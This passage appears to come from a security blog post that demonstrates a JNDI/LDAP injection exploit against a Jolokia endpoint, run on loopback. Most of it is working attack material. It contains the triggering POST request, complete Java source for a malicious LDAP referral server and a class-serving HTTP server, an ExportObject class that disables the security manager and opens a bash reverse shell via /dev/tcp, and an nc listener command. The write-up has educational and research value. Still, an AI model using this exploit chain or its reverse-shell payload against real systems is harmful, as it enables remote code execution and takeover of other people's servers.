For demonstration purposes we’ll run all of the components in the exploit chain on the loopback interface.
The following POST request can be used to exploit this vulnerability:

POST /jolokia/ HTTP/1.1
Host: localhost:10007
Content-Type: application/x-www-form-urlencoded
Content-Length: 206

{
    "type" : "read",
    "mbean" : "java.lang:type=Memory",
    "target" : { 
         "url" : "service:jmx:rmi:///jndi/ldap://localhost:9092/jmxrmi"
    } 
}

We need to create LDAP and HTTP servers in order to serve a malicious payload. These code snippets were originally taken from marshalsec and zerothoughts GitHub repositories.

public class LDAPRefServer {
  private static final String LDAP_BASE = "dc=example,dc=com";
  public static void main ( String[] args ) {
    int port = 1389;
    // Create LDAP Server and HTTP Server
    if ( args.length < 1 || args[ 0 ].indexOf('#') < 0 ) {
      System.err.println(LDAPRefServer.class.getSimpleName() + " <codebase_url#classname> [<port>]"); 
      System.exit(-1);
    }
    else if ( args.length > 1 ) {
      port = Integer.parseInt(args[ 1 ]);
    }
    try {
      InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
      config.setListenerConfigs(new InMemoryListenerConfig(
        "listen",
        InetAddress.getByName("0.0.0.0"), 
        port,
        ServerSocketFactory.getDefault(),
        SocketFactory.getDefault(),
        (SSLSocketFactory) SSLSocketFactory.getDefault()));
      config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
      InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
      System.out.println("Listening on 0.0.0.0:" + port); 
      ds.startListening();

      System.out.println("Starting HTTP server");
      HttpServer httpServer = HttpServer.create(new InetSocketAddress(7873), 0);
      httpServer.createContext("/",new HttpFileHandler());
      httpServer.setExecutor(null);
      httpServer.start();

    } catch ( Exception e ) {
      e.printStackTrace();
    }
  }

  private static class OperationInterceptor extends InMemoryOperationInterceptor {
    private URL codebase;
    public OperationInterceptor ( URL cb ) {
      this.codebase = cb;
    }

    @Override
    public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
      String base = result.getRequest().getBaseDN();
      Entry e = new Entry(base);
      try {
        sendResult(result, base, e);
      } catch ( Exception e1 ) {
        e1.printStackTrace();
      }
    }
    
    protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
      URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
      System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
      e.addAttribute("javaClassName", "ExportObject");
      String cbstring = this.codebase.toString();
      int refPos = cbstring.indexOf('#');
      if ( refPos > 0 ) {
        cbstring = cbstring.substring(0, refPos);
      }
      System.out.println("javaCodeBase: " + cbstring);
      e.addAttribute("javaCodeBase", cbstring);
      e.addAttribute("objectClass", "javaNamingReference"); 
      e.addAttribute("javaFactory", this.codebase.getRef());
      result.sendSearchEntry(e);
      result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
  }
}
view rawLDAPRefServer.java hosted with ❤ by GitHub
public class HttpFileHandler implements HttpHandler {
  public void handle(HttpExchange httpExchange) {
    try {
      System.out.println("new http request from " + httpExchange.getRemoteAddress() + " " + httpExchange.getRequestURI());
      InputStream inputStream = HttpFileHandler.class.getResourceAsStream("ExportObject.class");
      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
      while(inputStream.available()>0) {
        byteArrayOutputStream.write(inputStream.read());
      }

      byte[] bytes = byteArrayOutputStream.toByteArray();
      httpExchange.sendResponseHeaders(200, bytes.length);
      httpExchange.getResponseBody().write(bytes);
      httpExchange.close();
    } catch(Exception e) {
      e.printStackTrace();
    }
  }
}
view rawHttpFileHandler.java hosted with ❤ by GitHub
After that we need to create an ExportObject.java with reverse shell command. The bytecode of this class will be served from our HTTP server:

public class ExportObject {
  public ExportObject() {
    try {
      System.setSecurityManager(null);
      java.lang.Runtime.getRuntime().exec("sh -c $@|sh . echo `bash -i >& /dev/tcp/127.0.0.1/7777 0>&1`");
    } catch(Exception e) {
      e.printStackTrace();
    }
  }
}
view rawExportObject.java hosted with ❤ by GitHub
The LDAP Server should be run with the following command line arguments:

http://127.0.0.1:7873/#ExportObject 9092
where:
http://127.0.0.1:7873/ is the URL of the attacker’s HTTP server
ExportObject is name of the Java class containing the attacker’s code
9092 is the LDAP server listen port
Start an nc listener on port 7777:

$ nc -lv 7777
After the reuqest shown in step #1 is sent, the vulnerable server makes request to the attacker’s LDAP server.


When the LDAP server, listening on the port 9092, receives a request from the vulnerable server, it creates an Entry object with attributes and returns it in the LDAP response.

e.addAttribute("javaClassName", "ExportObject");
e.addAttribute("javaCodeBase", "http://127.0.0.1/");
e.addAttribute("objectClass", "javaNamingReference");
e.addAttribute("javaFactory", "ExportObject");
When the vulnerable server receives the LDAP response, it fetches the ExportObject.class from the attacker’s HTTP server, instantiates the object and executes the reverse shell command.

The attacker receives the connection back from the vulnerable server on his nc listener.